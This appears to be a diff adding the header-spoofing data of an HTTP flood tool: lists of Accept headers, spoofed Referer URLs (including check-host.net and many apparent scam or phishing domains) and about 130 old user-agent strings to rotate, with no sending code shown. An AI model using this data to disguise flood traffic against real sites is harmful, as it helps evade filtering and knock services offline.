@@ -1,0 +1,936 @@
+$acceptall = "@text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	     @text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8
+	     @application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5
+	     @text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	     @image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*
+	     @text/html, application/xhtml+xml, image/jxr, */*
+	     @text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
+	     @text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8
+	     @text/html, application/xhtml+xml
+	     @text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	     @text/plain;q=0.8,image/png,*/*;q=0.5
+             "
+
+$referers = "@https://www.google.com/search?q=
+	   @https://check-host.net/
+	   @https://www.facebook.com/
+	   @https://www.youtube.com/
+	   @https://www.fbi.com/
+	   @https://www.bing.com/search?q=
+	   @https://r.search.yahoo.com/
+	   @https://www.cia.gov/index.html
+	   @https://vk.com/profile.php?redirect=
+	   @https://www.usatoday.com/search/results?q=
+	   @https://help.baidu.com/searchResult?keywords=
+ 	   @https://steamcommunity.com/market/search?q=
+	   @https://www.ted.com/search?q=
+	   @https://play.google.com/store/search?q=
+	   @https://www.qwant.com/search?q=
+	   @https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=
+	   @https://www.google.ad/search?q=
+	   @https://www.google.ae/search?q=
+	   @https://www.google.com.af/search?q=
+	   @https://www.google.com.ag/search?q=
+	   @https://www.google.com.ai/search?q=
+	   @https://www.google.al/search?q=
+	   @https://www.google.am/search?q=
+	   @https://www.google.co.ao/search?q=
+           @https://www.cssource2.pro
+@https://www.csource2.com
+@https://www.ldthinkhimun.com
+@https://www.edindeedeisas.com
+@https://www.webprotectpro.com
+@https://www.trackingtrns.com
+@https://www.csgo2drop.com
+@https://www.csgo2code.com
+@https://www.csgo2betatest.ru
+@https://www.csgo2beta.com
+@https://www.csgo2-source.com
+@https://www.csgo2-beta.com
+@https://www.cs2beta.ru
+@https://www.access-source.com
+@https://www.xn--ciqpnp3a065a7wel2g1ydmx5e.com
+@https://www.webcastrugby.com
+@https://www.vidiearn.com
+@https://www.tuhogarecologico.com
+@https://www.tpconsultops.com
+@https://www.top-deal-shop.com
+@https://www.reisys.se
+@https://www.quitbanqi.com
+@https://www.psecu-protect.com
+@https://www.plenizo.com
+@https://www.menutiga.com
+@https://www.menusatu.com
+@https://www.menusakti.com
+@https://www.menunusantara.com
+@https://www.menulima.com
+@https://www.menudua.com
+@https://www.khamiantiquestore.com
+@https://www.jobwal.com
+@https://www.globaligltd.com
+@https://www.ganeshastores.com
+@https://www.frontdeluxe.com
+@https://www.frigad.com
+@https://www.featherrivergoods.com
+@https://www.esotti.com
+@https://www.danieldujaxco.com
+@https://www.caltechtrading.com
+@https://www.bltilingremodeling.com
+@https://www.bestringtonesnet.com
+@https://www.affinityshoppingstorellc.com
+@https://www.worlowedonh.com
+@https://www.tictastesnlynot.com
+@https://www.20230329.com
+@https://www.onlineplayboyjob.com
+@https://www.evaluacionpersonalviaregislmarzobenefic.com
+@https://www.beubihar.com
+@https://www.acesso30horas-upgrade.com
+@https://www.winx360.com
+@https://www.sumpactopay.com
+@https://www.mixlitecoins.com
+@https://www.mirandajennifer.com
+@https://www.iksbeauty.com
+@https://www.hpbeautys.com
+@https://www.goldenexchadmin.com
+@https://www.gaian-construction.com
+@https://www.doshaswifeai.com
+@https://www.dogumgunuorganizasyonfiyatlari.com
+@https://www.ak-pay.com
+@https://www.pampers-loja.com
+@https://www.lojas-cacaushow.com
+@https://www.lojas-andrade.com
+@https://www.cartier-gold.com
+@https://www.cacau--show.com
+@https://www.bebidas-cocacola.com
+@https://www.xenobix.com
+@https://www.worldcrestcryptominerfund.org
+@https://www.westrocktrade.com
+@https://www.wealth-masterclass.org
+@https://www.virtuefxmarkets.com
+@https://www.venuxtrade.com
+@https://www.valcoinexx.online
+@https://www.upsurge-capital.org
+@https://www.systemicerrfix.com
+@https://www.tdfinancials.com
+@https://www.techminingexplore.com
+@https://www.textverified.ga
+@https://www.thebitfinex.com
+@https://www.topcryptocoins.info
+@https://www.topviewstocks.com
+@https://www.trademecoin.com
+@https://www.trademininginvestpeo.com
+@https://www.traderblockchain.org
+@https://www.traderminers.org
+@https://www.tradesvest.com
+@https://www.treasurestrade231.com
+@https://www.truist-cashbox.org
+@https://www.ultimatebitexchange.com
+@https://www.ultimatecointrading.com
+@https://www.upsilonprotocol.live
+@https://www.upfrontfxtrade.com
+@https://www.ntedmanahegaz.com
+@https://www.obrightsapphir.com
+@https://www.live-find-cloud.live
+@https://www.adthereissom.com
+@https://www.foreyeshehadtw.com
+@https://www.axp2thqo3xsw.com
+@https://www.nmcqrdnj.com
+@https://www.crypinvestments.com
+@https://www.crediblelx.com
+@https://www.wpspingerinvestment.online
+@https://www.wfgmininggroup.live
+@https://www.usdpool.cc
+@https://www.universaltradesoptionx.com
+@https://www.tradexcoins.online
+@https://www.sterlingcaptcha.tech
+@https://www.starlinginv.net
+@https://www.starcoinminers.com
+@https://www.stablecapitalinvest.online
+@https://www.solutionwhales.com
+@https://www.solutiondigital.info
+@https://www.skywayfxinvest.com
+@https://www.shieldcloudmining.org
+@https://www.safetradeprofit.online
+@https://www.roymarcorporation.com
+@https://www.premiumshareslimited.com
+@https://www.olvifinance.com
+@https://www.metaforcecapital.com
+@https://www.investocks.org
+@https://www.intrexmining.com
+@https://www.gramcoinstrade.com
+@https://www.globalfinancelimited.com
+@https://www.glistrade.com
+@https://www.fxpremiertradex.com
+@https://www.future-financeltd.net
+@https://www.fintechs-growth.com
+@https://www.fidelityalliance-fx.com
+@https://www.fandcholding.com
+@https://www.dexiainvestment.com
+@https://www.defitrades.online
+@https://www.daxueglobal.com
+@https://www.cryptotrustmining.com
+@https://www.coin-blocks.com
+@https://www.citicapitalinvestment.com
+@https://www.ciscominner.com
+@https://www.cevacoinvest.com
+@https://www.buygooglecoins.com
+@https://www.boanufx.com
+@https://www.blockchainserverminer.com
+@https://www.blakcoinfxmine.com
+@https://www.bitprimefinance.net
+@https://www.bitcoinfxwallet.com
+@https://www.beeemmiigrate.xyz
+@https://www.bazemaxminers.com
+@https://www.autotradebroker.net
+@https://www.app-txidcontract.com
+@https://www.apexprotrade.com
+@https://www.360bullexchange.com
+@https://www.defiintegrationapp.online
+@https://www.sarasotadreamweddings.com
+@https://www.traderprofx.com
+@https://www.reliablecointrade.com
+@https://www.maxhashcryptto.com
+@https://www.dailyupdate.click
+@https://www.patriotsilverinvestment.com
+@https://www.etoromining.in
+@https://www.anjowallet.com
+@https://www.allianz-capital.online
+@https://www.cryptwealthoptions.com
+@https://www.abstracttrading.com
+@https://www.tesla4gpt.com
+@https://www.tesla-gpt4.net
+@https://www.expressbase.ltd
+@https://www.elon-gpt4.net
+@https://www.elon-ai.net
+@https://www.treasuredinvestmentslimited.com
+@https://www.tradeaffairslimited.com
+@https://www.swissprimeglobal.com
+@https://www.onlineserviceupdate.com
+@https://www.mutualfinancelimited.com
+@https://www.keystoneequitylimited.com
+@https://www.imperiagrowthlimited.com
+@https://www.iban-lbc-messagerie.fr
+@https://www.grandalphalimited.com
+@https://www.gembotai.com
+@https://www.defiinvestmentlimited.com
+@https://www.cryptoandcoincoin.com
+@https://www.cornetexpresscourier.com
+@https://www.carsonciti.com
+@https://www.capitalpathltd.com
+@https://www.assetalliancefinance.com
+@https://www.amrosgloballtd.com
+@https://www.ameexexchange.com
+@https://www.adriatradeltd.com
+@https://www.accordinvestmentslimited.com
+@https://www.stake-bull.com
+@https://www.setorfinanceiropj.com
+@https://www.fix-exchange.com
+@https://www.microsoftpowered.com
+@https://www.livraison-suivi-colis.fr
+@https://www.immo-comtois.fr
+@https://www.globalfidelitycapitalgroup.com
+@https://www.delta-service.fr
+@https://www.mecanismodesegurancabradesprime.com
+@https://www.tashia.online
+@https://www.suette.online
+@https://www.slanie.online
+@https://www.slania.online
+@https://www.sitala.online
+@https://www.sisika.online
+@https://www.seydabutik.com
+@https://www.samsunosmanliotel.com
+@https://www.samsunmercedesservisi.com
+@https://www.samsunbesk.net
+@https://www.ruuqco.com
+@https://www.routinepush.com
+@https://www.pandorabuyoffer.com
+@https://www.nftproverse.com
+@https://www.mufera.com
+@https://www.monexterieur-jardin.com
+@https://www.modaewa.com
+@https://www.milcontrolvalves.com
+@https://www.livanafashion.com
+@https://www.kenankonacoglu.com
+@https://www.kaiservers.com
+@https://www.kaibutik.com
+@https://www.invest-in-you.fr
+@https://www.haziranbutik.com
+@https://www.forindolaw.com
+@https://www.fennimakine.com
+@https://www.ezelcevre.com
+@https://www.bluesolest.com
+@https://www.allmagictools.com
+@https://www.albiakolivas.com
+@https://www.abenfinansiering.com
+@https://www.taonforhavinga.info
+@https://www.ganismpro.com
+@https://www.vagosbet8.com
+@https://www.vagosbet7.com
+@https://www.vagosbet6.com
+@https://www.vagosbet5.com
+@https://www.vagosbet4.com
+@https://www.vagosbet3.com
+@https://www.vagosbet2.com
+@https://www.vagosbet10.com
+@https://www.vagosbet1.com
+@https://www.vagosbet.com
+@https://www.zionslbarks.com
+@https://www.usaolx.com
+@https://www.successstoryinhindi.com
+@https://www.successstoryhindi.com
+@https://www.registroparaelprestamopersonalbpc.com
+@https://www.optlmism.site
+@https://www.modamoderna.com
+@https://www.michelleannserlin.com
+@https://www.lacasadoscursos.com
+@https://www.gbwhatsapkdownload.com
+@https://www.bpostorbapo.com
+@https://www.xn--fiq54bt33ad1nk5pp3y.com
+@https://www.web3inity.com
+@https://www.vagosbet9.com
+@https://www.theatreworkshops.fr
+@https://www.taxisairportparis.fr
+@https://www.taxipriveparis.fr
+@https://www.taxicentraleparis.fr
+@https://www.resataxiparis.fr
+@https://www.recargasjogos.com
+@https://www.rbshholding.com
+@https://www.picktaxiparis.fr
+@https://www.orimerce.com
+@https://www.nooralkarama.com
+@https://www.multiburo-casiers.fr
+@https://www.mon-chauffeur-idf.fr
+@https://www.igir.online
+@https://www.girsyap.nl
+@https://www.firstclasstransports.fr
+@https://www.faciliteacessonline.com
+@https://www.danone-casiers.fr
+@https://www.creaprodigital.fr
+@https://www.conceptamenagement-casiers.fr
+@https://www.cluster15-orange-casiers.fr
+@https://www.cluster14-orange-casiers.fr
+@https://www.cluster13-orange-casiers.fr
+@https://www.cluster12-orange-casiers.fr
+@https://www.dentwithought.com
+@https://www.rikehemanwho.com
+@https://www.d1or04kku1mxl9.cloudfront.net
+@https://www.binancesupp.com
+@https://www.cgir.online
+@https://www.casier-izybat-labinnov.fr
+@https://www.assistance-serrurier-idf.fr
+@https://www.amandes-francegouv.fr
+@https://www.allotaxivtcparis.fr
+@https://www.ac-bnl.com
+@https://www-ttbbank.com
+@https://www.www-ttbbank.com
+@https://www-tnnthailand.com
+@https://www.www-tnnthailand.com
+@https://www-tcg-th.com
+@https://www.www-tcg-th.com
+@https://www-gsb-or-th.com
+@https://www.www-gsb-or-th.com
+@https://www-bot-th.com
+@https://www.www-bot-th.com
+@https://www-1213-or-th.com
+@https://www.www-1213-or-th.com
+@https://www.tcg-or-th.com
+@https://www.scureupgrade.com
+@https://www.nazionale-infomatica.com
+@https://www.michelle-grant1.com
+@https://www.gsb-or-th.com
+@https://www.bot-or-th.com
+@https://www.avvatrade.com
+@https://www.amende-servicegouv.com
+@https://www.varmblixt-dk.com
+@https://www.offres-magiques.nl
+@https://www.offre-go-paris.nl
+@https://www.go-paris-offre.nl
+@https://www.go-offrebelle.nl
+@https://www.daglige-tilbud-dk.com
+@https://www.brute-force.fr
+@https://www.best-offre-nice.nl
+@https://www.belleparis-fr.com
+@https://www.beau-moda.nl
+@https://www.acess-seguroweb.com
+@https://www.accountneflix.com
+@https://www.abn-formingg.fr
+@https://www.xn--gmq972a5qdsxinvg4kbn88i5no0si6c.com
+@https://www.xn--fiqz6l97glrenpwtts04fj74a.com
+@https://www.warrantfxsignal.com
+@https://www.vaileyoil.com
+@https://www.tauzone.com
+@https://www.sinopa.online
+@https://www.sibeal.online
+@https://www.shamia.online
+@https://www.residenceszz.com
+@https://www.rbautosupplies.com
+@https://www.qfsglobalz.com
+@https://www.phone-ios.com
+@https://www.paradisecornpany.com
+@https://www.pacterio.com
+@https://www.mkeystore.com
+@https://www.maoskiexpresstransportes-gmail.com
+@https://www.henryautoparts.com
+@https://www.frankllncorp.com
+@https://www.franklinc0rp.com
+@https://www.digitalcriticsreviews.com
+@https://www.cloud-9.shop
+@https://www.bobandluna.com
+@https://www.apotheekonlinewinkel.nl
+@https://www.aat-pac.com
+@https://www.9kale.com
+@https://www.850gsm.com
+@https://www.synergybioemedical.com
+@https://www.orion-straeategies.com
+@https://www.lhscorop.com
+@https://www.jaeger-unietek.com
+@https://www.inertiaengineeers.com
+@https://www.healthcareitlleaders.com
+@https://www.gmri-gmri.com
+@https://www.ejunlper.com
+@https://www.fancesnett.com
+@https://www.chooose2rent.com
+@https://www.beasebest.com
+@https://www.valex.live
+@https://www.softjet.xyz
+@https://www.ralex.top
+@https://www.prostoapple.xyz
+@https://www.passive-income.monster
+@https://www.newmovement.bond
+@https://www.intelegent.xyz
+@https://www.exprof.live
+@https://www.babkistart.shop
+@https://www.zonedate.life
+@https://www.zillahsrounds.com
+@https://www.x876789a.store
+@https://www.womanforyou.life
+@https://www.windsurfscreen.com
+@https://www.upbestorderz.buzz
+@https://www.topflirtnow.life
+@https://www.swehot.tk
+@https://www.spinforwin.click
+@https://www.sonika.fun
+@https://www.simpledatings.life
+@https://www.sexxtoronto.com
+@https://www.sabung-ayam-svv388.com
+@https://www.romancelady.life
+@https://www.romanceroundup.life
+@https://www.piypiy.pw
+@https://www.openerloader.com
+@https://www.originalspartner.life
+@https://www.neuromastone.com
+@https://www.naughtynext-women.life
+@https://www.myflirtvibenow.life
+@https://www.myfancydating.life
+@https://www.mydatingreal.life
+@https://www.metasa.fun
+@https://www.megaflirt.life
+@https://www.men-finder.life
+@https://www.mega-flirtbooks.life
+@https://www.meetinglove.life
+@https://www.mailfromyou.com
+@https://www.ladysuper.life
+@https://www.latitudesxom.com
+@https://www.kneadzoomer.com
+@https://www.ketozyba.cyou
+@https://www.ketoyfovoxipow.fun
+@https://www.ketoxomykybagen.fun
+@https://www.ketowipymykydo.fun
+@https://www.ketousuvacoco.fun
+@https://www.ketosyryduber.fun
+@https://www.ketosebanobowen.fun
+@https://www.ketorecava.cyou
+@https://www.ketooqumicoco.fun
+@https://www.ketoojirucoco.fun
+@https://www.ketonodalogiwu.fun
+@https://www.ketomykytuqejo.fun
+@https://www.ketokohokisud.buzz
+"
+
+
+$UAs = "@Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)
+@Googlebot/2.1 (http://www.googlebot.com/bot.html)
+@Opera/9.20 (Windows NT 6.0; U; en)
+@Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)
+@Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)
+@Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0
+@Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16
+@Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)
+@Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13
+@Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)
+@Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
+@Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)
+@Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
+@Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8
+@Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7
+@Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+@Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
+@YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)	
+@Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)
+@Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)
+@Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)
+@Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51
+@AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
+@Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)
+@Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
+@Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
+@Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
+@Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
+@Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
+@Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1
+@Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)
+@Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)
+@Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)
+@Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51
+@Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)
+@Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E
+@Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)
+@Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15
+@Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)
+@Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)
+@Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7
+@BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0
+@Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)
+@Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)
+@Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)
+@Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10
+@Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)
+@Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007
+@BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179
+@Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)
+@Googlebot/2.1 (http://www.googlebot.com/bot.html)
+@Opera/9.20 (Windows NT 6.0; U; en)
+@Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)
+@Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)
+@Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0
+@Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16
+@Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)
+@Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13
+@Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)
+@Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
+@Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)
+@Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
+@Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8
+@Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7
+@Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+@Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
+@YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)
+@Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
+@Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1
+@Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)
+@Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)
+@Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)
+@Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51
+@AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
+@Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)
+@Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
+@Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
+@Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10
+@Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4
+@Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0
+@Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
+@Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)
+@Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+@Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)
+@Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
+@Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16
+@Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1
+@Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)
